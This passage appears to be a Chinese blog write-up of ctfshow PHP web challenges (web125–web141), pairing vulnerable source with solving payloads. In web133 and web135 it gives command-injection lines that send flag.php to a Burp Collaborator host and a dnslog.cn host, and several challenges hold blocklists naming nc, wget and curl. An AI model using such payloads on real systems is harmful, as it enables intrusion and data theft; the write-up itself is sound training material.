class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, $c)&amp;&amp;$c&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>($fl0g===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>Payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">get:  $fl0g&#x3D;flag_give_me;</span><br><span class="line">post:  CTF_SHOW&#x3D;1&amp;CTF%5bSHOW.COM&#x3D;1&amp;fun&#x3D;eval($a[0])</span><br></pre></td></tr></table></figure>
<p>预期解：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET:?1&#x3D;flag.php</span><br><span class="line">POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;highlight_file($_GET[1])</span><br></pre></td></tr></table></figure>
<h3 id="web126">web126</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">$c=$_POST[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, $c) &amp;&amp; strlen($c)&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>($fl0g===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET:?a&#x3D;1+fl0g&#x3D;flag_give_me</span><br><span class="line">POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;parse_str($a[1])</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET:?$fl0g&#x3D;flag_give_me</span><br><span class="line">POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;assert($a[0])</span><br></pre></td></tr></table></figure>
<h3 id="web127">web127**</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$ctf_show = md5($flag);</span><br><span class="line">$url = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//特殊字符检测</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$url</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, $url))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(waf($url))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;嗯哼？&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract($_GET);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($ctf_show===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还是用123题目的脚本进行爆破：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url,$data</span>)</span>&#123;</span><br><span class="line">	$ch = curl_init(); </span><br><span class="line">	curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">	curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">	curl_setopt($ch, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);</span><br><span class="line">	$response = curl_exec($ch);</span><br><span class="line">	curl_close($ch);</span><br><span class="line">	<span class="keyword">return</span> strlen($response);</span><br><span class="line">&#125;</span><br><span class="line">$url=<span class="string">&quot;http://127.0.0.1/test.php&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt;=<span class="number">128</span> ; $i++) &#123; </span><br><span class="line">	<span class="keyword">for</span> ($j=<span class="number">0</span>; $j &lt;=<span class="number">128</span> ; $j++) &#123;</span><br><span class="line">			$data=<span class="string">&quot;ctf&quot;</span>.urlencode(chr($i)).<span class="string">&quot;show&quot;</span>.<span class="string">&quot;=123&quot;</span>;</span><br><span class="line">				<span class="keyword">if</span>(curl($url,$data)!=<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">echo</span> $data.<span class="string">&quot;\n&quot;</span>; </span><br><span class="line">				&#125;</span><br><span class="line">   		&#125;</span><br><span class="line">   	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;ctf_show&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果下面这些字符都等同于<code>ctf_show</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+ _ [ .</span><br></pre></td></tr></table></figure>
<p>+在url起到空格的作用，payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctf show&#x3D;ilove36d</span><br></pre></td></tr></table></figure>
<h3 id="web128">web128</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$f1 = $_GET[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">$f2 = $_GET[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(check($f1))&#123;</span><br><span class="line">    var_dump(call_user_func(call_user_func($f1,$f2)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !preg_match(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>考察点：gettext拓展的使用</p>
<p>在开启该拓展后 _() 等效于 gettext()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> gettext(<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line"><span class="comment">//结果  phpinfo</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> _(<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line"><span class="comment">//结果 phpinfo</span></span><br></pre></td></tr></table></figure>
<p>因为我们要得到的flag就在flag.php中，所以可以直接用get_defined_vars</p>
<p><code>?f1=_&amp;f2=get_defined_vars</code></p>
<h3 id="web129">web129</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    $f = $_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stripos($f, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> readfile($f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>预期解：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<p>非预期解</p>
<p>PHP伪协议会忽略无效的编码方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode|ctfshow&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web131">web131</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">rror_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    $f = (<span class="keyword">String</span>)$_POST[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, $f))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(stripos($f,<span class="string">&#x27;36Dctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用正则最大回溯次数绕过，回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。</p>
<p>python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://5884fe43-69c8-4cdc-83bf-728fc1e41baf.chall.ctf.show/&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line">	<span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;36Dctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<h3 id="web132">web132</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $username = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    $code = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($code === mt_rand(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; $password === $flag || $username ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>($code == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>考察<code>&amp;&amp;</code>和<code>||</code>运算符的应用。</p>
<blockquote>
<p>x &amp;&amp; y 当x为false时，直接跳过，不执行y； 对于“或”（||） 运算 ： x||y 当x为true时，直接跳过，不执行y</p>
</blockquote>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a&#x3D;admin&amp;b&#x3D;admin&amp;c&#x3D;admin</span><br></pre></td></tr></table></figure>
<h3 id="web133">web133</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($F = @$_GET[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, $F))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr($F,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这道题目挺绕的，主要考察命令执行的骚操作以及外带数据，curl -F的使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">传递参数?F&#x3D;&#96;$F &#96;;sleep 3，可以发现后面的sleep 3这条语句确实执行了。</span><br><span class="line">原因就是：</span><br><span class="line">substr(&#39;&#96;$F&#96;;+sleep 3&#39;, 0, 6) &#x3D; &#96;$F &#96;;</span><br><span class="line">然后再调用eval(&quot;&#96;$F&#96;;&quot;);</span><br><span class="line">此时，$F&#x3D;&#96;$F &#96;;sleep 3</span><br><span class="line">最后执行的代码就是：&#96;&#96;$F &#96;;sleep 3&#96;</span><br></pre></td></tr></table></figure>
<p>然后就是利用curl带出flag.php。</p>
<p><code>curl -F </code>将flag文件上传到Burp的 Collaborator Client （ Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看 POST请求包以及打Cookies）</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?F&#x3D;&#96;$F&#96;;+curl -X POST -F xx&#x3D;@flag.php http:&#x2F;&#x2F;wtt33xn74ddcsjguu6symf2l3c94xt.burpcollaborator.net</span><br></pre></td></tr></table></figure>
<h3 id="web134">web134</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$key1 = <span class="number">0</span>;</span><br><span class="line">$key2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>($_GET[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>($_POST[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>($_POST[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@parse_str($_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>($key1 == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; $key2 == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>考察数组变量覆盖，举个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">parse_str($_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">var_dump($_POST);</span><br></pre></td></tr></table></figure>
<p>传入<code>?_POST['a']=123</code>，输出<code>array(1) &#123; [&quot;'a'&quot;]=&gt; string(3) &quot;123&quot; &#125;</code></p>
<p>Payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?_POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d</span><br></pre></td></tr></table></figure>
<h3 id="web135">web135</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($F = @$_GET[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, $F))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr($F,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>web131的升级版，直接把flag.php读出来再重定向到另外一个文件，访问即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?F&#x3D;&#96;$F&#96;;+nl flag.php&gt;flag</span><br></pre></td></tr></table></figure>
<p>另外预期解提到使用Ping命令带出数据，我试了一下没能成功。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?F&#x3D;&#96;$F&#96;;+ping &#96;cat flag.php|awk &#39;NR&#x3D;&#x3D;2&#39;&#96;.yex0qj.dnslog.cn</span><br></pre></td></tr></table></figure>
<p>但是经过测试单独的ping命令确实是可以执行成功。</p>
<h3 id="web136">web136</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, $x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    check($c);</span><br><span class="line">    exec($c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>感觉是考察命令执行，Linux中可以使用tee命令写文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls &#x2F;|tee file</span><br></pre></td></tr></table></figure>
<p>返回flag文件名<code>f149_15_h3r3</code></p>
<p><code>nl /f149_15_h3r3 | tee file</code></p>
<h3 id="web137">web137</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func($_POST[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>双冒号可以不用实例化一个类的情况下调用类的静态方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#x3D;ctfshow:getFlag</span><br></pre></td></tr></table></figure>
<h3 id="web138">web138</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strripos($_POST[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;<span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func($_POST[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>PHP官方文档中的一个例子：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201114213505.png" alt=""></p>
<p>所以可以使用数组来绕过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow[0]&#x3D;ctfshow&amp;ctfshow[1]&#x3D;getFlag</span><br></pre></td></tr></table></figure>
<h3 id="web139">web139</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, $x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    check($c);</span><br><span class="line">    exec($c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>相比136这次没有写文件的权限了，但是最开始提到可以sleep，那么就可以用盲注的形式先猜文件名，再猜flag。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="web140">web140</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    $f1 = (<span class="keyword">String</span>)$_POST[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    $f2 = (<span class="keyword">String</span>)$_POST[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, $f1))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, $f2))&#123;</span><br><span class="line">            $code = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(intval($code) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>PHP弱类型比较和函数运用</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201115141244.png" alt=""></p>
<p>从表中可以发现，0和字符串比较为True，也就是<code>intval($code)</code>需要返回一个0，并且intval会将非数字字符转换为0。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">md5(phpinfo())</span><br><span class="line">md5(sleep())</span><br><span class="line">md5(md5)</span><br><span class="line">usleep(usleep())</span><br></pre></td></tr></table></figure>
<h3 id="web141">web141</h3>
